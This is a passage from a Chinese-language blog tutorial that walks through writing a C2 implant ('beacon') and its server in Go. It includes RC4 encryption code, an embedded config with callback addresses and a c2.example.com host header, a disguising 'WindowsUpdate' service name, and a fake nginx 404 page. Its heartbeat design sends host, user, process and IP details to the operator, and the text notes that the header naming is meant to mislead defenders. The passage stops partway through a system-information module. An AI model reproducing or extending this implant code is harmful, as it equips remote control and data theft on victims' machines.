<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> crypt  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/rc4&quot;</span>  </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RC4Crypt</span><span class="params">(data []<span class="type">byte</span>, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    rc4crypt, errcrypt := rc4.NewCipher(key)  </span><br><span class="line">    <span class="keyword">if</span> errcrypt != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;rc4 crypt error&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    decryptData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(data))  </span><br><span class="line">    rc4crypt.XORKeyStream(decryptData, data)  </span><br><span class="line">    <span class="keyword">return</span> decryptData, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-3-接口测试"><a href="#3-3-接口测试" class="headerlink" title="3.3 接口测试"></a>3.3 接口测试</h2><p>重启服务器</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<p>先启动监听器，然后在生成beacon</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/28/22-02-50-53089b376af56d0e87476c17648c682f-20250728220250-cf41f7.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/29/20-15-17-ace60520f1ada884cf55531e2173fc37-20250729201516-92014c.png"></p>
<p>可以看到postman确实接收到服务器传来的base64编码后的beacon文件名和文件内容，正常情况下需要client自己解码并输出到 <code>*.exe、*.dll、*elf、*.bin</code> 文件中。本项目为了实现方便，将beacon输出到服务器的 <code>static/product</code> 目录中</p>
<p>用文件比较工具对比一下patch前后的文件，左边是模板文件，右边是patch后的文件。可以很明显的看到前4个字节是json序列化的字节长度，后面则是未加密的json序列化数据。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/29/20-13-25-b09f54b4a9daeb276b0296fa77da7d6d-20250729201324-fc2a23.png"></p>
<p>静态分析过后，我们运行生成后的产物，我在模板文件中是有两段输出的，第一段是直接将json序列化后的字节数据转换为string类型输出；第二段是json反序列化后输出（证明能反序列化）</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/28/21-34-35-2e65069b81dbb4bbbf22399cacf207a0-20250728213434-f85a8f.png"></p>
<h1 id="四、Beacon上线服务器并完成注册"><a href="#四、Beacon上线服务器并完成注册" class="headerlink" title="四、Beacon上线服务器并完成注册"></a>四、Beacon上线服务器并完成注册</h1><h2 id="4-1-解密配置-Beacon端"><a href="#4-1-解密配置-Beacon端" class="headerlink" title="4.1 解密配置-Beacon端"></a>4.1 解密配置-Beacon端</h2><p>配置中包含了beacon运行的必要信息，比如sessionkey、callback_address、uri、sleep，是否开启ssl等关键信息。为了调试方便，可以约定硬编码上述字段的值。</p>
<p>正常来说是要先解密存储在placeholder字节切片中的数据再进行反序列化还原配置，为了方便，我们直接反序列化吧，方法是之前说过的 <code>LoadConfig</code>，还有为了调式方便，需要硬编码配置信息，具体看代码！</p>
<p><code>profile/profile.go</code> 包含BeaconGenerateConfig结构体和LoadConfig方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> profile</span><br><span class="line"></span><br><span class="line"><span class="comment">// CONFIG_MARKER_2024 + 5120 字节空洞</span></span><br><span class="line"><span class="keyword">var</span> placeholder = [<span class="number">5120</span>]<span class="type">byte</span>&#123;</span><br><span class="line">	<span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> BeaconProfile BeaconGenerateConfig</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> BeaconGenerateConfig <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// 来自 GenerateConfig</span></span><br><span class="line">	Os            <span class="type">string</span> <span class="string">`json:&quot;os&quot;`</span></span><br><span class="line">	Arch          <span class="type">string</span> <span class="string">`json:&quot;arch&quot;`</span></span><br><span class="line">	Format        <span class="type">string</span> <span class="string">`json:&quot;format&quot;`</span></span><br><span class="line">	Sleep         <span class="type">int</span>    <span class="string">`json:&quot;sleep&quot;`</span></span><br><span class="line">	Jitter        <span class="type">int</span>    <span class="string">`json:&quot;jitter&quot;`</span></span><br><span class="line">	SvcName       <span class="type">string</span> <span class="string">`json:&quot;svcname&quot;`</span></span><br><span class="line">	IsKillDate    <span class="type">bool</span>   <span class="string">`json:&quot;is_killdate&quot;`</span></span><br><span class="line">	Killdate      <span class="type">string</span> <span class="string">`json:&quot;kill_date&quot;`</span></span><br><span class="line">	Killtime      <span class="type">string</span> <span class="string">`json:&quot;kill_time&quot;`</span></span><br><span class="line">	IsWorkingTime <span class="type">bool</span>   <span class="string">`json:&quot;is_workingtime&quot;`</span></span><br><span class="line">	StartTime     <span class="type">string</span> <span class="string">`json:&quot;start_time&quot;`</span></span><br><span class="line">	EndTime       <span class="type">string</span> <span class="string">`json:&quot;end_time&quot;`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 来自 ConfigDetail（去掉 SSLCertPath 、 SSLKeyPath、PageError）</span></span><br><span class="line">	HostBind          <span class="type">string</span>            <span class="string">`json:&quot;host_bind&quot;`</span></span><br><span class="line">	PortBind          <span class="type">int</span>               <span class="string">`json:&quot;port_bind&quot;`</span></span><br><span class="line">	CallbackAddresses []<span class="type">string</span>          <span class="string">`json:&quot;callback_addresses&quot;`</span></span><br><span class="line">	SSL               <span class="type">bool</span>              <span class="string">`json:&quot;ssl&quot;`</span></span><br><span class="line">	SSLCert           []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_cert,omitempty&quot;`</span></span><br><span class="line">	SSLKey            []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_key,omitempty&quot;`</span></span><br><span class="line">	HTTPMethod        <span class="type">string</span>            <span class="string">`json:&quot;http_method&quot;`</span></span><br><span class="line">	URI               <span class="type">string</span>            <span class="string">`json:&quot;uri&quot;`</span></span><br><span class="line">	HBHeader          <span class="type">string</span>            <span class="string">`json:&quot;hb_header&quot;`</span></span><br><span class="line">	HBPrefix          <span class="type">string</span>            <span class="string">`json:&quot;hb_prefix&quot;`</span></span><br><span class="line">	UserAgent         <span class="type">string</span>            <span class="string">`json:&quot;user_agent&quot;`</span></span><br><span class="line">	HostHeader        <span class="type">string</span>            <span class="string">`json:&quot;host_header&quot;`</span></span><br><span class="line">	RequestHeaders    <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;request_headers,omitempty&quot;`</span></span><br><span class="line">	ResponseHeaders   <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;response_headers,omitempty&quot;`</span></span><br><span class="line">	XForwardedFor     <span class="type">bool</span>              <span class="string">`json:&quot;x_forwarded_for&quot;`</span></span><br><span class="line">	PageError         <span class="type">string</span>            <span class="string">`json:&quot;page_error&quot;`</span></span><br><span class="line">	ServerHeaders     <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;server_headers,omitempty&quot;`</span></span><br><span class="line">	Protocol          <span class="type">string</span>            <span class="string">`json:&quot;protocol&quot;`</span></span><br><span class="line">	EncryptKey        []<span class="type">byte</span>            <span class="string">`json:&quot;encrypt_key,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行时读取并反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">func LoadConfig() (BeaconGenerateConfig, error) &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	// 检查</span></span><br><span class="line"><span class="comment">	if len(placeholder) &lt; 4 &#123;</span></span><br><span class="line"><span class="comment">		return BeaconGenerateConfig&#123;&#125;, fmt.Errorf(&quot;buffer too small&quot;)</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	// 读取json长度</span></span><br><span class="line"><span class="comment">	lengthBytes := placeholder[:4]</span></span><br><span class="line"><span class="comment">	length := binary.LittleEndian.Uint32(lengthBytes)</span></span><br><span class="line"><span class="comment">	if length == 0 &#123;</span></span><br><span class="line"><span class="comment">		return BeaconGenerateConfig&#123;&#125;, fmt.Errorf(&quot;no config embedded&quot;)</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	// 检查</span></span><br><span class="line"><span class="comment">	end := 4 + int(length)</span></span><br><span class="line"><span class="comment">	if end &gt; len(placeholder) &#123;</span></span><br><span class="line"><span class="comment">		return BeaconGenerateConfig&#123;&#125;, fmt.Errorf(&quot;invalid length&quot;)</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	// 反序列化json</span></span><br><span class="line"><span class="comment">	var cfg BeaconGenerateConfig</span></span><br><span class="line"><span class="comment">	if err := json.Unmarshal(placeholder[4:end], &amp;cfg); err != nil &#123;</span></span><br><span class="line"><span class="comment">		return BeaconGenerateConfig&#123;&#125;, err</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	println(string(placeholder[4:end]))</span></span><br><span class="line"><span class="comment">	return cfg, nil</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadConfig</span><span class="params">()</span></span> (BeaconGenerateConfig, <span class="type">error</span>) &#123;</span><br><span class="line">	cfg := BeaconGenerateConfig&#123;</span><br><span class="line">		<span class="comment">// 来自 GenerateConfig</span></span><br><span class="line">		Os:            <span class="string">&quot;windows&quot;</span>,</span><br><span class="line">		Arch:          <span class="string">&quot;x64&quot;</span>,</span><br><span class="line">		Format:        <span class="string">&quot;exe&quot;</span>,</span><br><span class="line">		Sleep:         <span class="number">5</span>,</span><br><span class="line">		Jitter:        <span class="number">20</span>,</span><br><span class="line">		SvcName:       <span class="string">&quot;WindowsUpdate&quot;</span>,</span><br><span class="line">		IsKillDate:    <span class="literal">true</span>,</span><br><span class="line">		Killdate:      <span class="string">&quot;2024-12-31&quot;</span>,</span><br><span class="line">		Killtime:      <span class="string">&quot;23:59&quot;</span>,</span><br><span class="line">		IsWorkingTime: <span class="literal">false</span>,</span><br><span class="line">		StartTime:     <span class="string">&quot;09:00&quot;</span>,</span><br><span class="line">		EndTime:       <span class="string">&quot;18:00&quot;</span>,</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 来自 ConfigDetail</span></span><br><span class="line">		HostBind:          <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">		PortBind:          <span class="number">443</span>,</span><br><span class="line">		CallbackAddresses: []<span class="type">string</span>&#123;<span class="string">&quot;http://192.168.1.1:9000&quot;</span>&#125;,</span><br><span class="line">		SSL:               <span class="literal">true</span>,</span><br><span class="line">		SSLCert:           []<span class="type">byte</span>&#123;&#125;, <span class="comment">// 可放真实证书</span></span><br><span class="line">		SSLKey:            []<span class="type">byte</span>&#123;&#125;, <span class="comment">// 可放真实私钥</span></span><br><span class="line">		URI:               <span class="string">&quot;index.php&quot;</span>,</span><br><span class="line">		HBHeader:          <span class="string">&quot;X-Session-Id&quot;</span>,</span><br><span class="line">		HBPrefix:          <span class="string">&quot;SESSIONID=&quot;</span>,</span><br><span class="line">		UserAgent:         <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>,</span><br><span class="line">		HostHeader:        <span class="string">&quot;c2.example.com&quot;</span>,</span><br><span class="line">		RequestHeaders: <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">		ResponseHeaders: <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">		XForwardedFor: <span class="literal">false</span>,</span><br><span class="line">		PageError:     <span class="string">&quot;&lt;html&gt;&lt;body&gt;404 Not Found&lt;/body&gt;&lt;/html&gt;&quot;</span>, <span class="comment">// 这里要注意</span></span><br><span class="line">		ServerHeaders: <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">			<span class="string">&quot;Server&quot;</span>: <span class="string">&quot;nginx/1.18.0&quot;</span>,</span><br><span class="line">		&#125;,</span><br><span class="line">		Protocol:   <span class="string">&quot;https&quot;</span>,</span><br><span class="line">		EncryptKey: []<span class="type">byte</span>(<span class="string">&quot;01234567890123456789&quot;</span>), <span class="comment">// RC4/AES 密钥示例</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cfg, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-2-收集系统信息生成心跳包-Beacon端"><a href="#4-2-收集系统信息生成心跳包-Beacon端" class="headerlink" title="4.2 收集系统信息生成心跳包-Beacon端"></a>4.2 收集系统信息生成心跳包-Beacon端</h2><p>在典型C2框架的实现中，Beacon在解密并解析其运行时配置后，会立即执行一次全面的主机枚举，收集系统的上的一些信息提供给操作人员使用，收集的信息通常包含<strong>beaconid、进程名、进程id、线程id、系统架构、主机名、当前用户名、ACP</strong>等等基础信息。</p>
<p>值得说明的是全面的信息收集只会执行一次，上述信息经序列化后，被封装为初始<strong>心跳包</strong>（heartbeat）的数据，此后，Beacon进入周期性心跳阶段。心跳并非重新拉取完整载荷，而是以固定格式的轻量请求维持长轮询通道，用于：</p>
<ol>
<li>保活（keep-alive）；</li>
<li>轮询C2服务器是否存在待执行任务（task queue）。</li>
</ol>
<p>心跳包通常用监听器中生成的密钥进行加密，其会话密钥由<strong>监听器（listener）在生成阶段随机派生并嵌入 Beacon 配置</strong>，加密完成后再进行base64编码然后放置到请求头中，其键名可由操作员自定义，默认为“X-Session-ID”，然后还有前缀“SESSIONID&#x3D;”，能够有效的迷惑防御者。</p>
<p>在构造心跳包时有必要说一下TLV协议，TLV（Tag-Length-Value）是一种<strong>通用的二进制数据编码格式</strong>，听名字很高大上的样子，其实说白了就是<strong>自定义通信结构体</strong>，其中T是Tag，表示数据的类型或业务含义；L是Length，表示可变数据的长度（比如说byteArray，string），V是Value，可为原始数据（如字符串、整数）。</p>
<p>在本项目中，<strong>心跳包、任务包和结果包</strong>属于TLV协议的范畴，但是又与它的定义有些区别，主要是</p>
<ol>
<li><strong>Tag字段用不到</strong>：因为C2框架主要是在一个小圈子中使用，server和client，server和beacon，约定好什么功能，哪个时间接收到相应的包，这样也就不需要标识这个包的类型了</li>
<li><code>[]byte</code>类型需要自己打包长度，因为有些数据会进行二次打包，比如说下文<code>五、任务创建</code>时task任务数据会被先打包一次，然后这个打包后的数据还会和长度、taskid、commandid再打包一次形成真正的任务包，为了避免字段冗余，需要自己确定那个<code>[]byte</code>要打包长度字段，不知道各位能否get到我的意思呢？</li>
<li><strong>Length只有byteArray和string类型用到</strong>：server和client，server和beacon字段事先约定好打包顺序和解包顺序，对于不变字长的数据，直接解读（如byte、int16、int32），对于可变字长的数据，需要用长度来表示接下来要解读的数据长度。</li>
</ol>
<table>
<thead>
<tr>
<th>字段名</th>
<th>类型 &#x2F; 字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>BeaconID</td>
<td>uint32 &#x2F; 4 B</td>
<td>随机生成的Beacon会话ID（网络字节序&#x2F;小端均可，需与C2约定）。</td>
</tr>
<tr>
<td>BeaconName</td>
<td>string</td>
<td><strong>变长字段</strong>；先写 4 B Length，再些数据</td>
</tr>
<tr>
<td>Sleep</td>
<td>int32 &#x2F; 4 B</td>
<td>心跳间隔秒数（&gt;0）。</td>
</tr>
<tr>
<td>Jitter</td>
<td>int32 &#x2F; 4 B</td>
<td>抖动百分比（0-100），目前未使用，可填0。</td>
</tr>
<tr>
<td>KillDate</td>
<td>int32 &#x2F; 4 B</td>
<td>到期自毁；未使用时填0。</td>
</tr>
<tr>
<td>WorkingTime</td>
<td>int32 &#x2F; 4 B</td>
<td>每日可工作时段（分钟数）；未使用时填0。</td>
</tr>
<tr>
<td>ACP</td>
<td>int16 &#x2F; 2 B</td>
<td>ANSI 代码页（如936）。</td>
</tr>
<tr>
<td>OemCP</td>
<td>int16 &#x2F; 2 B</td>
<td>OEM 代码页（如936）。</td>
</tr>
<tr>
<td>GmtOffset</td>
<td>int8 &#x2F; 1 B</td>
<td>本机相对 UTC 的分钟偏移</td>
</tr>
<tr>
<td>Pid</td>
<td>int16 &#x2F; 2 B</td>
<td>当前进程PID。</td>
</tr>
<tr>
<td>Tid</td>
<td>int16 &#x2F; 2 B</td>
<td>执行线程TID。</td>
</tr>
<tr>
<td>BuildNumber</td>
<td>int32 &#x2F; 4 B</td>
<td>Windows Build Number（如19045）。</td>
</tr>
<tr>
<td>MajorVer</td>
<td>int8 &#x2F; 1 B</td>
<td>主版本号（如10 →10）。</td>
</tr>
<tr>
<td>MinorVer</td>
<td>int8 &#x2F; 1 B</td>
<td>次版本号（如0）。</td>
</tr>
<tr>
<td>InternalIP</td>
<td>uint32 &#x2F; 4 B</td>
<td>本地 IPv4 转uint32（小端）。</td>
</tr>
<tr>
<td>Flag</td>
<td>int8 &#x2F; 1 B</td>
<td>位标志，未使用</td>
</tr>
<tr>
<td>SessionKey</td>
<td>[]byte</td>
<td><strong>变长字段</strong>；对称会话密钥；先写 4 B Length，再写密钥字节。</td>
</tr>
<tr>
<td>Domain</td>
<td>[]byte</td>
<td><strong>变长字段</strong>；域名字符串；先写 4 B Length，再写字节串。</td>
</tr>
<tr>
<td>Computer</td>
<td>[]byte</td>
<td><strong>变长字段</strong>；主机名字符串；同上。</td>
</tr>
<tr>
<td>Username</td>
<td>[]byte</td>
<td><strong>变长字段</strong>；当前用户名字符串；同上。</td>
</tr>
<tr>
<td>Process</td>
<td>[]byte</td>
<td><strong>变长字段</strong>；进程名字符串；同上。</td>
</tr>
</tbody></table>
<p>⚠<strong>注意</strong>：一共有两把密钥：</p>
<ol>
<li>第一把密钥<strong>在配置里</strong>，server用来<strong>加密配置</strong>和<strong>解密心跳包</strong>的数据，beacon用来<strong>解密配置</strong>和<strong>加密心跳包</strong>的数据</li>
<li>第二把密钥<strong>在心跳包</strong>里，server用来<strong>加密任务包</strong>和<strong>解密结果包</strong>，beacon用来<strong>解密任务包</strong>和<strong>加密结果包</strong></li>
</ol>
<p><code>sysinfo/sysinfo.go</code>：收集系统信息的工具函数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sysinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/user&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Kernel32 = syscall.NewLazyDLL(<span class="string">&quot;Kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取本机第一个非回环IPv4地址</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetInternalIp</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	addrs, err := net.InterfaceAddrs()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, addr := <span class="keyword">range</span> addrs &#123;</span><br><span class="line">		<span class="keyword">if</span> ipnet, ok := addr.(*net.IPNet); ok &amp;&amp; !ipnet.IP.IsLoopback() &amp;&amp; ipnet.IP.To4() != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> ipnet.IP.String()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取域名（Windows下为WORKGROUP或域名，Linux下为主机名）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetDomain</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> runtime.GOOS == <span class="string">&quot;windows&quot;</span> &#123;</span><br><span class="line">		<span class="comment">// Windows下尝试获取USERDOMAIN</span></span><br><span class="line">		<span class="keyword">return</span> os.Getenv(<span class="string">&quot;USERDOMAIN&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Linux下用主机名</span></span><br><span class="line">	name, _ := os.Hostname()</span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCodePageANSI</span><span class="params">()</span></span> (<span class="type">int32</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	fnGetACP := Kernel32.NewProc(<span class="string">&quot;GetACP&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> fnGetACP.Find() != <span class="literal">nil</span> &#123;</span><br><span 